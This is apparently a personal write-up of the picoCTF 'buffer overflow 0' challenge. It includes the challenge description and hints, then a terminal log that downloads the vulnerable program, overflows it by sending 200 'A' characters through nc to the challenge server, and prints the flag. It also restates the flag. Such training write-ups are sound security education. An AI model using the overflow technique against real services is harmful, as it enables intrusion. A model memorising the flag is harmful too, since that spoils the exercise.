# buffer overflow 0

## Descripción
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/172/vuln). You can view source [here](https://artifacts.picoctf.net/c/172/vuln.c). And connect with it using: `nc saturn.picoctf.net 63397`
## Pistas
How can you trigger the flag to print?
If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
Run `man gets` and read the BUGS section. How many characters can the program really read?
## Solución
```bash
(kali㉿kali)-[~/Documents/binaryExplloitation]
└─$ wget https://artifacts.picoctf.net/c/172/vuln      
--2023-05-11 21:41:47--  https://artifacts.picoctf.net/c/172/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.160.124.119, 18.160.124.108, 18.160.124.34, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.160.124.119|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                      100%[====================================================================================>]  15.64K  --.-KB/s    in 0s      

2023-05-11 21:41:48 (144 MB/s) - ‘vuln’ saved [16016/16016]

                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/binaryExplloitation]
└─$ wget https://artifacts.picoctf.net/c/172/vuln.c
--2023-05-11 21:42:07--  https://artifacts.picoctf.net/c/172/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.160.124.38, 18.160.124.34, 18.160.124.108, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.160.124.38|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                    100%[====================================================================================>]     808  --.-KB/s    in 0s      

2023-05-11 21:42:07 (22.7 MB/s) - ‘vuln.c’ saved [808/808]
(kali㉿kali)-[~/Documents/binaryExplloitation]
└─$ nc saturn.picoctf.net 63397 <<< $(python3 -c "print('A'*200)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}
                                                                                  
┌──(kali㉿kali)-[~/Documents/binaryExplloitation]
└─$ 

```
## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}

## Notas Adicionales 
comando          descripción

## Referencias